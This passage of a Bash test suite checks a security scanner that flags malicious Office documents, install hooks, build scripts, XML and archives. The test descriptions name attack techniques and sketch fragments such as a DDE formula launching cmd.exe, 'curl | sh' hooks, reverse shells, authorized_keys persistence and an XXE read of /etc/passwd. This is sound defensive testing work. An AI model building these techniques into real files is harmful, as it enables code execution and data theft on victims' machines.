        assert_contains "$(line_for office_rt2_rtf_bin_brace_ole2link.rtf)" "CWE-829:rtf_linked_object_updates_from_a_remote_source" \
            "…and for a CVE-2017-0199 link object"
        assert_contains "$(line_for office_rt2_rtf_renamed.txt)" "$DDE_MSG" \
            "an RTF named .txt is read as an RTF (Word opens it as one)"
        assert_contains "$(line_for office_rt2_rtf_renamed.log)" "$DDE_MSG" \
            "…named .log"
        assert_contains "$(line_for office_rt2_rtf_noext)" "$DDE_MSG" \
            "…with no extension at all"
        assert_contains "$(line_for office_rt2_flat_opc.xml)" "$DDE_MSG" \
            "a Flat OPC package saved as .xml (Word opens it as a document) is read as one"
        JPN=$(line_for office_rt2_plain_notes.txt)
        assert_not_contains "$JPN" "office:" \
            "a plain .txt that merely mentions RTF is not routed to the office scanner"
        # Third round of red-teaming
        assert_contains "$(line_for office_rt3_dde_pipe_cref.xlsx)" "$DDE_MSG" \
            "a DDE formula whose pipe is written &#124; is still found (the gate cannot read the raw text)"
        assert_contains "$(line_for office_rt3_dde_msexcel.xlsx)" "$DDE_MSG" \
            "=MSEXCEL|'..\\cmd.exe /c ...'!'' starts a shell through the service that is always installed"
        JDC=$(line_for office_rt3_dde_calc.xlsx)
        assert_contains "$JDC" "office:dde_connection_declared" \
            "a DDE formula to an ordinary program is reported"
        assert_not_contains "$JDC" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_rt3_ddelink_msexcel.xlsx)" "$DDE_MSG" \
            "an Excel ddeLink to MSEXCEL whose topic is a command line is flagged"
        assert_contains "$(line_for office_rt3_ppaction_cref.pptx)" "CWE-78:office_presentation_action_runs_a_program" \
            "action=\"ppaction:&#47;/program\" is still a program action"
        assert_contains "$(line_for office_rt3_ods_dde_cref.ods)" "$DDE_MSG" \
            "an ODF DDE() call with the quotes written &#34; is decoded and flagged"
        JOC=$(line_for office_rt3_ods_dde_calc.ods)
        assert_contains "$JOC" "office:dde_connection_declared" \
            "…and a DDE() call to an ordinary service is reported"
        assert_not_contains "$JOC" "[FAIL]" \
            "…without blocking"
        XXE_MSG="CWE-611:office_part_declares_an_external_entity"
        assert_contains "$(line_for office_rt3_xxe_rels.docx)" "$XXE_MSG" \
            "an external entity in _rels/.rels is flagged"
        assert_contains "$(line_for office_rt3_xxe_odf_meta.odt)" "$XXE_MSG" \
            "…in an ODF meta.xml"
        assert_contains "$(line_for office_rt3_xxe_odf_settings.odt)" "$XXE_MSG" \
            "…in settings.xml"
        assert_contains "$(line_for office_rt3_xxe_odf_manifest.odt)" "$XXE_MSG" \
            "…and in META-INF/manifest.xml"
        URI_MSG="CWE-94:office_link_uses_a_script_or_diagnostic_uri_scheme"
        assert_contains "$(line_for office_rt3_hyperlink_msdt.docx)" "$URI_MSG" \
            "a HYPERLINK field to ms-msdt: fails like the same address as a relationship"
        assert_contains "$(line_for office_rt3_hyperlink_js.docx)" "$URI_MSG" \
            "…a fldSimple HYPERLINK to javascript:"
        assert_contains "$(line_for office_rt3_hyperlink_unc.docx)" "office:hyperlink_to_a_unc_path" \
            "…and a HYPERLINK field to a file share is reported"
        assert_not_contains "$(line_for office_rt3_hyperlink_ok.docx)" "office:" \
            "a HYPERLINK field to an https address is not reported"
        assert_not_contains "$(line_for office_rt3_link_dotcom.docx)" "hyperlink_targets_a_program" \
            "mailto:a@b.com and http://example.com are web addresses, not links to a .com program"
        assert_contains "$(line_for office_rt3_link_dotcom_path.docx)" "office:hyperlink_targets_a_program" \
            "…while file:///C:/Users/a/run.com still is one"
        assert_contains "$(line_for office_rt3_dde_lower.doc)" "$DDE_MSG" \
            "a legacy .doc with ddeauto in lower case is flagged"
        assert_contains "$(line_for office_rt3_dde_path.doc)" "$DDE_MSG" \
            "…and DDE \"C:\\...\\cmd.exe\" \"/c calc\""
        assert_not_contains "$(line_for office_rt3_dde_prose.doc)" "[FAIL]" \
            "prose that mentions DDE and cmd is not a DDE field"
        assert_contains "$(line_for office_rt3_xls_supbook_dde.xls)" "$DDE_MSG" \
            "a legacy .xls SUPBOOK record holding a DDE link to cmd is flagged"
        assert_contains "$(line_for office_rt3_xls_supbook_unc.xls)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "…and an external workbook on a file share"
        assert_not_contains "$(line_for office_rt3_xls_supbook_local.xls)" "office:" \
            "…while a link to a workbook on a local path is not reported"
        assert_contains "$(line_for office_rt3_truncated_workbook.doc)" "$DDE_MSG" \
            "a Workbook stream that ends inside a record does not stop the analysis of the rest"
        assert_contains "$(line_for office_rt3_polyglot_docx_odf.docx)" "$DDE_MSG" \
            "a .docx that also carries an ODF mimetype entry is still read as OOXML"
        assert_contains "$(line_for office_rt3_polyglot_docx_odf_rel.docx)" "$VBA_MSG" \
            "…including the relationships that name an embedded package"
        assert_contains "$(line_for office_rt3_polyglot_odt_ooxml.odt)" "$ODFMSG" \
            "an .odt that also carries a [Content_Types].xml is still read as ODF"
        JSU=$(line_for office_rt3_stray_unreadable.odt)
        assert_contains "$JSU" "$ODFMSG" \
            "one ODF part that cannot be read does not stop the macro in another from being found"
        assert_contains "$JSU" "office:parts_could_not_be_read" \
            "…and is reported"
        assert_contains "$(line_for office_rt3_main_as_rels.docx)" "$DDE_MSG" \
            "a main part stored under a .rels name outside _rels/ is read as XML"
        assert_contains "$(line_for office_rt3_vba_winexec.docm)" "$VBA_MSG" \
            "a macro that declares WinExec starts a program"
        JVD=$(line_for office_rt3_vba_msxml_dom.xlsm)
        assert_not_contains "$JVD" "[FAIL]" \
            "CreateObject(\"MSXML2.DOMDocument\") parses XML and is not a download"
        assert_contains "$JVD" "office:vba_macro_runs_when_the_document_opens" \
            "…but its Workbook_Open is reported"
        PKG_MSG="CWE-506:office_embeds_an_executable_or_script"
        assert_not_contains "$(line_for office_rt3_script_mentions_rtf)" "not_an_office_document" \
            "an extensionless script that mentions {\\rtf in a comment is not reported as a broken office file"
        assert_contains "$(line_for office_rt3_script_mentions_rtf)" "[FAIL]" \
            "…it is scanned as the shell script it is (curl | sh)"
        assert_contains "$(line_for office_rt3_notes_mentions_rtf.txt)" "CWE-798" \
            "a .txt note that mentions {\\rtf still gets the document credential check"
        assert_contains "$(line_for office_rt3_pkg_xll.doc)" "$PKG_MSG" \
            "an OLE Package named addin.xll (an Excel add-in that runs on load) is an executable"
        assert_contains "$(line_for office_rt3_pkg_far_pe.doc)" "$PKG_MSG" \
            "a PE whose header lies past the first 4 KB is still a PE"
        assert_contains "$(line_for office_rt3_pkg_text.doc)" "office:contains_embedded_object" \
            "an OLE Package holding text is reported and not blocked"
        assert_contains "$(line_for office_rt_vba_declare_continued.docm)" "$VBA_MSG" \
            "a declaration whose API name is on a continuation line is judged as one statement"
        assert_contains "$(line_for office_rt_vba_declare_ntdll.docm)" "$VBA_MSG" \
            "NtAllocateVirtualMemory declared from ntdll is a loader"
        RTF_LINK="CWE-829:rtf_linked_object_updates_from_a_remote_source"
        assert_contains "$(line_for office_rt_ole2link_class_only.rtf)" "$RTF_LINK" \
            "an OLE2Link object is flagged by its class and a UTF-16 URL, without the update flags"
        assert_contains "$(line_for office_rt_ole2link_moniker_only.rtf)" "$RTF_LINK" \
            "an object carrying a URL moniker and a UTF-16 URL is flagged whatever its class"
        assert_contains "$(line_for office_rt_ole2link_flags_wide.rtf)" "$RTF_LINK" \
            "an auto-updating linked object with a UTF-16 URL is flagged whatever its class"
        assert_contains "$(line_for office_legacy_ppt_macro.ppt)" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "a macro inside a legacy .ppt (a compressed ExOleObjStg record) is found"
        assert_not_contains "$(line_for office_embedded_workbook.docx)" "[WARN]" \
            "an embedded workbook (a chart's data) that analyses clean is not reported"
        assert_not_contains "$(line_for office_legacy_objpool_workbook.doc)" "[WARN]" \
            "a legacy embedded Excel workbook is not reported either"
        JEZ=$(line_for office_embedded_zip.docx)
        assert_contains "$JEZ" "office:contains_embedded_object" \
            "an embedded ZIP that is not an office document is reported"
        assert_not_contains "$JEZ" "not_an_office_document" \
            "…and does not make the DOCUMENT look like something else"
        assert_contains "$(line_for office_legacy_package_stream.doc)" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "a macro in an OOXML package wrapped in an OLE object (a Package stream) is found"

        # ── setup.py ─────────────────────────────────────────────────────────
        # setup.py runs on a source `pip install`, so it is install-time code with
        # its own risk model: os.system and subprocess are ordinary build tools
        # there, and fetching-then-executing is the thing that is not. The generic
        # Python rules failed 4 of 36 real setup.py files on ordinary idioms.
        assert_contains "$(line_for setup_evil/setup.py)" "CWE-78:setup_py_fetches_and_executes" \
            "setup.py piping a download into a shell is flagged"
        assert_contains "$(line_for setup_evil/setup.py)" "CWE-95:setup_py_executes_a_network_response" \
            "setup.py exec()-ing a network response is flagged"
        assert_contains "$(line_for setup_evil/setup.py)" "CWE-95:setup_py_decodes_and_executes" \
            "setup.py decoding a blob and exec()-ing it is flagged"
        assert_contains "$(line_for setup_evil/setup.py)" "CWE-78:setup_py_reverse_shell" \
            "setup.py opening a socket to a shell is flagged"
        assert_contains "$(line_for setup_evil/setup.py)" "CWE-912:setup_py_persistence" \
            "setup.py writing authorized_keys is flagged"

        # ── Gradle ───────────────────────────────────────────────────────────
        # A .gradle script is not a declarative file with a few dangerous
        # constructs in it: it is a program, compiled and evaluated in full at
        # CONFIGURATION time, on `gradle tasks`, on `--dry-run`, and on IDE
        # import. Before this, *.gradle fell through to scan_unknown (PASS) and
        # *.gradle.kts went to scan_kotlin, which has Kotlin SOURCE rules and
        # none of these.
        assert_contains "$(line_for gradle_evil/build.gradle)" "CWE-829:gradle_apply_from_remote_script" \
            "Gradle apply from an http:// URL is flagged"
        assert_contains "$(line_for gradle_evil/build.gradle)" "CWE-494:gradle_insecure_repository_protocol_enabled" \
            "Gradle allowInsecureProtocol = true is flagged"
        assert_contains "$(line_for gradle_evil/build.gradle)" "CWE-78:gradle_process_spawn_from_literal" \
            "Gradle \"cmd\".execute() is flagged"
        # build.gradle.kts must reach scan_gradle, not scan_kotlin: the Kotlin
        # spelling is isAllowInsecureProtocol and scan_kotlin cannot see it.
        assert_contains "$(line_for gradle_kts/build.gradle.kts)" "CWE-494:gradle_insecure_repository_protocol_enabled" \
            "build.gradle.kts is scanned as Gradle (isAllowInsecureProtocol)"
        assert_contains "$(line_for gradle_kts/build.gradle.kts)" "CWE-78:gradle_process_spawn_from_literal" \
            "build.gradle.kts new ProcessBuilder(...) is flagged"
        assert_contains "$(line_for gradle_evil/gradle.properties)" "CWE-829:gradle_daemon_java_agent" \
            "-javaagent in org.gradle.jvmargs is flagged"
        assert_contains "$(line_for gradle_evil/gradle.properties)" "CWE-494:gradle_dependency_verification_disabled" \
            "org.gradle.dependency.verification=off is flagged"
        assert_contains "$(line_for gradle_evil/gradle.properties)" "CWE-798:gradle_credential_in_properties" \
            "signing.password=<literal> in gradle.properties is flagged"
        assert_contains "$(line_for gradle_evil/gradle.properties)" "CWE-295:gradle_truststore_override" \
            "a trustStore override in gradle.properties is reported"
        assert_contains "$(line_for gradle_wrapper_evil/gradle-wrapper.properties)" "CWE-494:gradle_wrapper_plaintext_distribution" \
            "a plaintext distributionUrl in the wrapper is flagged"

        # ── Package manifests ────────────────────────────────────────────────
        # package.json and requirements.txt got one inline credential grep and
        # nothing else, so an install hook that pipes a download into a shell
        # was approved. npm runs preinstall/install/postinstall on every
        # `npm install`, and prepare on a bare one: execution before any build.
        assert_contains "$(line_for pkg_evil/package.json)" "CWE-78:npm_lifecycle_hook_fetches_and_executes" \
            "an npm postinstall piping curl into a shell is flagged"
        assert_contains "$(line_for pkg_evil/package.json)" "CWE-78:npm_lifecycle_hook_decodes_and_executes" \
            "an npm hook decoding base64 into a shell is flagged"
        # The key is written post\u0069nstall. npm reads that as postinstall; the
        # literal text "postinstall" appears nowhere in the file, so a pattern
        # rule never sees it. Only parsing the JSON does.
        assert_contains "$(line_for pkg_escaped/package.json)" "CWE-78:npm_lifecycle_hook_fetches_and_executes" \
            "an npm hook whose key is written with a \\u escape is still flagged"
        assert_contains "$(line_for pkg_evil/package.json)" "CWE-319:npm_dependency_over_plaintext" \
            "an npm dependency fetched over http:// or git:// is flagged"
        assert_contains "$(line_for composer_evil/composer.json)" "CWE-78:composer_hook_fetches_and_executes" \
            "a Composer install hook piping curl into a shell is flagged"
        assert_contains "$(line_for composer_evil/composer.json)" "CWE-319:composer_insecure_transport" \
            "Composer secure-http=false or an http:// repository is flagged"
        assert_contains "$(line_for req_evil/requirements.txt)" "CWE-319:pip_index_or_requirement_over_plaintext" \
            "a pip index or requirement over http:// or git:// is flagged"
        assert_contains "$(line_for req_evil/requirements.txt)" "CWE-798:pip_credentials_embedded_in_url" \
            "credentials embedded in a pip index URL are flagged"

        # ── XML ──────────────────────────────────────────────────────────────
        # XXE needs an entity that actually references an external resource.
        # A bare <!DOCTYPE was failing 736 of 3362 real XML files (22%), and
        # pom.xml and Ant's build.xml both route here — so Maven and Ant repos
        # were quarantined over a doctype.
        assert_contains "$(line_for xxe.xml)" "CWE-611:xxe_external_entity_references_a_resource" \
            "an entity referencing file:///etc/passwd is flagged"
        assert_contains "$(line_for credential.xml)" "CWE-798:hardcoded_credential_in_XML" \
            "a plaintext credential in XML element text is flagged"
        # A line-based rule is evaded by a line break; the declaration below
        # puts ENTITY, the name, SYSTEM and the target on four separate lines.
        assert_contains "$(line_for xxe_split.xml)" "CWE-611:xxe_external_entity_references_a_resource" \
            "an entity declaration split across lines is still flagged"
        assert_contains "$(line_for xml_bomb.xml)" "CWE-776:xml_entity_expansion_bomb" \
            "a nested-entity expansion bomb is flagged"

        # Build files that route through scan_xml: Maven and Ant have no
        # build-specific rules of their own, so pom.xml and build.xml were
        # checked for XXE and nothing else.
        assert_contains "$(line_for pom.xml)" "CWE-319:maven_repository_over_plaintext_http" \
            "a Maven repository over http:// is flagged"
        assert_contains "$(line_for pom.xml)" "CWE-78:maven_exec_runs_shell_or_downloader" \
            "exec-maven-plugin running sh is flagged"
        assert_contains "$(line_for build.xml)" "CWE-319:ant_get_over_plaintext_http" \
            "Ant <get> over http:// is flagged"
        assert_contains "$(line_for build.xml)" "CWE-78:ant_exec_runs_shell_or_downloader" \
            "Ant <exec> running sh is flagged"
        assert_contains "$(line_for build.xml)" "CWE-798:ant_credential_attribute" \
            "Ant <sshexec> with a literal password is flagged"

        # ── CMake ────────────────────────────────────────────────────────────
        # set(NAME "value") is a function call, not an assignment, so the
        # universal CWE-798 rule — which expects key = "value" — cannot see a
        # credential in a CMake file at all. And file(DOWNLOAD …) runs at
        # CONFIGURE time, so `cmake .` alone is enough to fetch and execute.
        assert_contains "$(line_for evil.cmake)" "CWE-798:cmake_hardcoded_credential" \
            "credential in a CMake set() call is flagged"
        assert_contains "$(line_for evil.cmake)" "CWE-319:cmake_download_over_plaintext_http" \
            "CMake fetching over plaintext http is flagged"
        assert_contains "$(line_for evil.cmake)" "CWE-295:cmake_tls_verification_disabled" \
            "CMake disabling TLS verification is flagged"
        assert_contains "$(line_for evil.cmake)" "cmake_hardening_disabled" \
            "CMake removing stack-protector or FORTIFY_SOURCE is flagged"

        # CMakeLists.txt ends in .txt, so without a basename branch it reaches
        # only the plain-text scanner.
        assert_contains "$(line_for CMakeLists.txt)" "CWE-798:cmake_hardcoded_credential" \
            "CMakeLists.txt is routed by basename, not by its .txt extension"

        # ── Universal layer: traversal and key material ──────────────────────
        # Both of these rules run on EVERY file, and neither had any test
        # coverage at all until now — while between them they quarantined 65%
        # of real HTML and 30% of real Makefiles.
        assert_contains "$(line_for traversal.txt)" "CWE-22:path_traversal" \
            "encoded, sensitive-target and input-composed traversal is flagged"
        assert_contains "$(line_for private_key.txt)" "CWE-321:hardcoded_private_key" \
            "a PEM private key block is flagged"
        assert_contains "$(line_for pgp_private.asc)" "CWE-321:hardcoded_private_key" \
            "a PGP private key with armor headers before the body is flagged"
        assert_contains "$(line_for service_account.json)" "CWE-321:hardcoded_private_key" \
            "a PEM key held on one line as a JSON string with \\n escapes is flagged"

        # ── False-positive guards: these must NOT be flagged ─────────────────
        # Regression guard for the P8 fix: the parameterised query form is the
        # correct, safe pattern and must never be reported as an injection.
        SAFE_LINE=$(echo "$F" | grep 'safe_sql.py' || true)
        assert_not_contains "$SAFE_LINE" "CWE-89" \
            "does NOT flag parameterised SQL (execute(\"… = ?\", (v,)))"

        SAFE_SH=$(echo "$F" | grep 'safe_shell.sh' || true)
        assert_not_contains "$SAFE_SH" "CWE-78" \
            "does NOT flag quoted shell variable expansion"

        # An ordinary document must stay clean. benign_doc.pdf embeds a subset
        # font, so it carries /AAAAAA+DejaVuSans tags; an unanchored /AA rule
        # reads those as an AdditionalActions key and would block this project's
        # own installation guide.
        # An ordinary Makefile must stay clean. `rm -rf $(BUILD)` in a clean
        # target and a bare `$(shell git rev-parse)` are the most common
        # constructs there are; a rule broad enough to flag them is unusable.
        SAFE_MK=$(echo "$F" | grep 'safe.mk' || true)
        assert_not_contains "$SAFE_MK" "CWE-78" \
            "does NOT flag rm -rf \$(BUILD) or a non-fetching \$(shell ...)"
        assert_not_contains "$SAFE_MK" "CWE-798" \
            "does NOT flag a Makefile credential sourced from the environment"

        # safe.html deliberately carries the near-miss of almost every rule
        # above: unescape(encodeURIComponent(x)) — the standard UTF-8 idiom
        # found in most bundled JS — an https script pinned with SRI, a
        # visible iframe with real dimensions, a relative form action, and a
        # cookie read in a different statement from its fetch().
        # A literal "../" is a relative path, not an attack. This is the guard
        # for the worst false positive the pipeline has had: -I../include and
        # href="../commands" quarantined the repository.
        # safe.cmake carries the near-miss of every CMake rule: a credential
        # read from the environment, a variable merely NAMED …_TOKEN, a
        # hash-pinned https download, execute_process running git, and a
        # set_package_properties URL — which is a homepage, not a fetch. Two
        # real CMake modules were failed by a rule that could not tell those
        # last two apart.
        # The near-misses: a husky `prepare`, a node -e guard (it is in a real
        # claude-code package.json), a local postinstall script, a download
        # script that is not a lifecycle hook, a dependency literally named
        # csrf-token, a file: link and a GitHub shorthand. Only the install-time
        # hook is worth a WARN; none may FAIL.
        SAFE_PKG=$(echo "$F" | grep 'pkg_safe/package.json' || true)
        assert_not_contains "$SAFE_PKG" "[FAIL]" \
            "does NOT fail an ordinary package.json (husky, node -e, file: link)"
        assert_contains "$SAFE_PKG" "npm:install_time_hook_present" \
            "an install-time hook is reported, but does not block"
        # The near-misses, each from a real setup.py: exec of a local version
        # file, a literal os.system (requests, ruamel.yaml), a git subprocess and
        # a build_ext subclass. Reported as a program being run; none may FAIL.
        SAFE_SETUP=$(echo "$F" | grep 'setup_safe/setup.py' || true)
        assert_not_contains "$SAFE_SETUP" "[FAIL]" \
            "does NOT fail exec(fp.read(), ns), a literal os.system or a git subprocess"
        assert_contains "$SAFE_SETUP" "setup:runs_a_program_at_install_time" \
            "setup.py running a program is reported, but does not block"

        # The measured near-misses. POM metadata over http:// matched 21 of 6249
        # real build scripts; query.execute() is a Gradle API call (2 of the 3
        # real .execute() hits); commandLineIncludePatterns is a property whose
        # name merely begins with commandLine; rootVariant.get() contains ant.get(.
        SAFE_GRADLE=$(echo "$F" | grep 'gradle_safe/build.gradle' || true)
        assert_not_contains "$SAFE_GRADLE" "[FAIL]" \
            "does NOT fail POM-metadata http:// urls, query.execute() or a local apply"
        assert_contains "$SAFE_GRADLE" "gradle_build_step_runs_process" \
            "an exec/commandLine build step is reported, but does not block"
        SAFE_KTS=$(echo "$F" | grep 'gradle_kts_safe/build.gradle.kts' || true)
        assert_not_contains "$SAFE_KTS" "[FAIL]" \
            "does NOT fail an ordinary build.gradle.kts"
        SAFE_GPROPS=$(echo "$F" | grep 'gradle_safe/gradle.properties' || true)
        assert_not_contains "$SAFE_GPROPS" "[FAIL]" \
            "does NOT fail JVM tuning flags or a blank signing.password"
        SAFE_WRAP=$(echo "$F" | grep 'gradle_wrapper_safe/gradle-wrapper.properties' || true)
        assert_not_contains "$SAFE_WRAP" "[FAIL]" \
            "does NOT fail an https distributionUrl"

        # Valid JSON with nothing to report yields no findings — which the first
        # version mistook for "could not parse", so 1172 of 1193 real manifests
        # went down the weaker pattern fallback. The repository and homepage
        # URLs here are what that fallback then failed 154 files on.
        PLAIN_PKG=$(echo "$F" | grep 'pkg_plain/package.json' || true)
        assert_not_contains "$PLAIN_PKG" "pkg:not_parsed" \
            "a valid package.json with nothing to report is not treated as unparseable"
        assert_not_contains "$PLAIN_PKG" "[FAIL]" \
            "does NOT fail repository and homepage URLs over git:// and http://"
        INVALID_PKG=$(echo "$F" | grep 'pkg_invalid/package.json' || true)
        assert_contains "$INVALID_PKG" "pkg:not_parsed_as_json_checked_by_pattern_only" \
            "invalid JSON is reported as inspected by pattern only"
        assert_contains "$INVALID_PKG" "CWE-78:npm_lifecycle_hook_fetches_and_executes" \
            "a hook in invalid JSON is still flagged by the pattern fallback"
        assert_not_contains "$INVALID_PKG" "CWE-319" \
            "the fallback does NOT read a repository url as a plaintext dependency"
        SAFE_COMPOSER=$(echo "$F" | grep 'composer_safe/composer.json' || true)
        assert_not_contains "$SAFE_COMPOSER" "[FAIL]" \
            "does NOT fail a Composer manifest with @php and callable hooks"
        SAFE_REQ=$(echo "$F" | grep 'req_safe/requirements.txt' || true)
        assert_not_contains "$SAFE_REQ" "[FAIL]" \
            "does NOT fail pinned requirements or a commit-pinned VCS line"
        assert_contains "$SAFE_REQ" "pip:trusted_host_disables_tls_verification" \
            "--trusted-host is reported, but does not block"

        # safe_xml.xml carries the whole false-positive set: an ordinary
        # PUBLIC doctype, two legitimate internal entities, the checkstyle
        # attribute lines the old credential rule matched by running [^>]*
        # across tag boundaries, and the four correct credential forms —
        # a ${...} reference, a Maven-encrypted value, a placeholder, and a
        # path to a key rather than the key.
        SAFE_XML=$(echo "$F" | grep 'safe_xml.xml' || true)
        assert_not_contains "$SAFE_XML" "CWE-611:xxe" \
            "does NOT flag an ordinary doctype or a text-shortcut entity"
        assert_not_contains "$SAFE_XML" "CWE-798" \
            "does NOT flag a checkstyle tokens attribute or a \${...} password"

        # safe_xml.xml also ends with a real-looking <password> inside <!-- -->,
        # the shape of Maven's own shipped settings.xml. That is covered by the
        # CWE-798 assertion above: without comment stripping it would fail.

        # safe.pom carries the default archetype homepage over http://, a
        # -SNAPSHOT version (176 of 221 real poms) and exec-maven-plugin running
        # java; build-safe.xml an https <get> and an env-sourced password.
        SAFE_POM=$(echo "$F" | grep 'safe.pom' || true)
        assert_not_contains "$SAFE_POM" "CWE-319" \
            "does NOT flag the archetype <url>http://maven.apache.org</url>"
        assert_not_contains "$SAFE_POM" "CWE-78" \
            "does NOT flag exec-maven-plugin running java"
        SAFE_ANT=$(echo "$F" | grep 'build-safe.xml' || true)
        assert_not_contains "$SAFE_ANT" "CWE-319" \
            "does NOT flag an Ant <get> over https"
        assert_not_contains "$SAFE_ANT" "CWE-798" \
            "does NOT flag an Ant password sourced from the environment"

        SAFE_CMAKE=$(echo "$F" | grep 'safe.cmake' || true)
        assert_not_contains "$SAFE_CMAKE" "CWE-798" \
            "does NOT flag a CMake credential read from the environment"
        assert_not_contains "$SAFE_CMAKE" "CWE-319" \
            "does NOT flag a homepage URL or a hash-pinned https download"
        assert_not_contains "$SAFE_CMAKE" "cmake_hardening_disabled" \
            "does NOT flag -fstack-protector-strong as disabled hardening"

        SAFE_PATHS=$(echo "$F" | grep 'safe_relative_paths.txt' || true)
        assert_not_contains "$SAFE_PATHS" "CWE-22" \
            "does NOT flag an ordinary relative path such as -I../include"

        # Writing about keys is not committing one, and a public certificate is
        # published by design.
        SAFE_KEY=$(echo "$F" | grep 'safe_key_prose.txt' || true)
        assert_not_contains "$SAFE_KEY" "CWE-321" \
            "does NOT flag the words PRIVATE KEY or CERTIFICATE in prose"
        # The same file also carries a PEM header used as a MIME magic signature,
        # which has no key body after it.
        assert_contains "$SAFE_KEY" "crypto:public_certificate_embedded" \
            "a public certificate is reported, but does not block"

        SAFE_HTML=$(echo "$F" | grep 'safe.html' || true)
        assert_not_contains "$SAFE_HTML" "CWE-95" \
            "does NOT flag unescape(encodeURIComponent(x)) as a payload"
        assert_not_contains "$SAFE_HTML" "CWE-319" \
            "does NOT flag an https script or a relative form action"
        assert_not_contains "$SAFE_HTML" "CWE-200" \
            "does NOT flag a cookie read separate from its fetch()"
        assert_not_contains "$SAFE_HTML" "html_hidden_iframe" \
            "does NOT flag a visible iframe with real dimensions"

        SAFE_PDF=$(echo "$F" | grep 'benign_doc.pdf' || true)
        assert_not_contains "$SAFE_PDF" "PDF_auto_execute" \
            "does NOT read a /AAAAAA+ font subset tag as an /AA auto-action"
        assert_not_contains "$SAFE_PDF" "CWE-94" \
            "does NOT flag an ordinary PDF as carrying active content"
    fi
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER B — End-to-end verdicts
# ═════════════════════════════════════════════════════════════════════════════
# ═════════════════════════════════════════════════════════════════════════════
# Java archive limits
# ═════════════════════════════════════════════════════════════════════════════
# scan_jar() never extracts to disk and bounds every read, so a decompression
# bomb costs a capped read. Each limit has to be REPORTED when it is reached: an
# archive that was not fully read must not look like one that was. The limits
# are environment knobs so the paths can be exercised on a 11 KB fixture.
group "Java archive limits"
if ! _skipping; then
    JARLIM="${SCRATCH}/jar_limits"
    mkdir -p "$JARLIM"
    cp "${FIXTURES}/rules/jar_big.jar" "$JARLIM/"
    cp "${FIXTURES}/rules/jar_late_slip.jar" "$JARLIM/"
    jar_with() {   # jar_with <file> VAR=value … ; prints the findings for that file
        local name="$1"; shift
        (
            export "$@"
            run_pipeline "$JARLIM" --quiet
            [[ -n "$RUN_JSON" ]] && json_findings "$RUN_JSON" | grep "/${name} " || true
        )
    }
    assert_contains "$(jar_with jar_big.jar JAR_MAX_ENTRIES=1)" "more than 1 entries" \
        "JAR_MAX_ENTRIES: entries beyond the limit are reported as not read"
    assert_contains "$(jar_with jar_late_slip.jar JAR_MAX_ENTRIES=1)" "CWE-22:jar_entry_path_traversal_zip_slip" \
        "JAR_MAX_ENTRIES does not limit the name check: a zip-slip entry past the limit is still found"
    assert_contains "$(jar_with jar_big.jar JAR_READ_BUDGET_MB=1)" "read budget of 1 MB exhausted" \
        "JAR_READ_BUDGET_MB: an exhausted read budget is reported"
    assert_contains "$(jar_with jar_big.jar JAR_VIEW_MB=1)" "capped at 1 MB" \
        "JAR_VIEW_MB: text beyond the credential-rule cap is reported"
    assert_contains "$(jar_with jar_big.jar JAR_MAX_UNCOMPRESSED_MB=1)" "jar:declared_uncompressed_size_over_limit" \
        "JAR_MAX_UNCOMPRESSED_MB: a declared size over the limit is reported"
    assert_contains "$(jar_with jar_big.jar JAR_TIME_BUDGET_S=0.001)" "time budget exceeded" \
        "JAR_TIME_BUDGET_S: an exceeded time budget is reported"

    # The helper must report a file it cannot open, not die: no facts at all would
    # read as "nothing found". Run as root a real permission error cannot be
    # produced, so the helper is extracted from the scanner and given a path that
    # is not there.
    # Regular expressions with unbounded classes go quadratic on adversarial input,
    # and the time budget is only checked between entries. 50000 repetitions of a
    # PEM-header fragment took the first version tens of seconds.
    JARPY="${SCRATCH}/jar_facts.py"
    # The helper lives in transit/containers/jar.py (it used to be a heredoc in scan_pipeline.sh);
    # the tests work on a copy so the mutation checks below never touch the real file.
    cp "${ROOT_DIR}/transit/containers/jar.py" "$JARPY"
    JARGONE=$(python3 -I "$JARPY" "${SCRATCH}/no_such.jar" "${SCRATCH}/view.txt" 2>&1 || true)
    assert_contains "$JARGONE" "FACT unreadable_file" \
        "a file that cannot be opened is reported as unreadable"
    assert_contains "$JARGONE" "FACT done" \
        "…and the helper still finishes, so the scanner can tell it from a crash"
    python3 -I - "${SCRATCH}/redos.jar" <<'PYEOF'
import sys, zipfile
with zipfile.ZipFile(sys.argv[1], "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("res/keys.txt", "-----BEGIN " + "PRIVATE KEY " * 50000)
PYEOF
    JARSLOW=$(timeout 20 python3 -I "$JARPY" "${SCRATCH}/redos.jar" "${SCRATCH}/view.txt" 2>&1 || true)
    assert_contains "$JARSLOW" "FACT done" \
        "adversarial repeated PEM-header fragments finish inside 20 s (no quadratic regex)"

    # The alarm: a helper stuck in a loop no budget check can reach prints what it found and exits.
    sed 's/^def to_view(label, text):$/emit("marker", "found before the hang")\nwhile True:\n    pass\n\n\ndef to_view(label, text):/' "$JARPY" > "${SCRATCH}/jar_facts_stuck.py"
    JARSTUCK=$(JAR_TIME_BUDGET_S=1 timeout 60 python3 -I "${SCRATCH}/jar_facts_stuck.py" "${FIXTURES}/rules/jar_safe.jar" "${SCRATCH}/view.txt" 2>&1 || true)
    assert_contains "$JARSTUCK" "FACT incomplete" \
        "a jar helper stuck past its time budget is stopped by the alarm and reports the archive as not fully read"
    assert_contains "$JARSTUCK" "FACT marker" \
        "…and keeps what it found before it was stopped"
    assert_contains "$JARSTUCK" "FACT done" \
        "…and still finishes, so the scanner can tell it from a crash"
fi

# ═════════════════════════════════════════════════════════════════════════════
# Office document limits and adversarial inputs
# ═════════════════════════════════════════════════════════════════════════════
# scan_office() never extracts to disk and bounds every read; each limit is REPORTED when it
# is reached. The patterns that read the XML must also stay linear: unbounded [^>]* and .*?
# are quadratic on megabytes of "<a<a<a…", and a 3 KB document ran for over a minute.
group "Office document limits"
if ! _skipping; then
    OFFLIM="${SCRATCH}/office_limits"
    mkdir -p "$OFFLIM"
    cp "${FIXTURES}/rules/office_big.docx" "$OFFLIM/"
    office_with() {   # office_with VAR=value … ; prints the findings for office_big.docx
        (
            export "$@"
            run_pipeline "$OFFLIM" --quiet
            [[ -n "$RUN_JSON" ]] && json_findings "$RUN_JSON" | grep "/office_big.docx " || true
        )
    }
    assert_contains "$(office_with OFFICE_MAX_ENTRIES=1)" "more than 1 parts" \
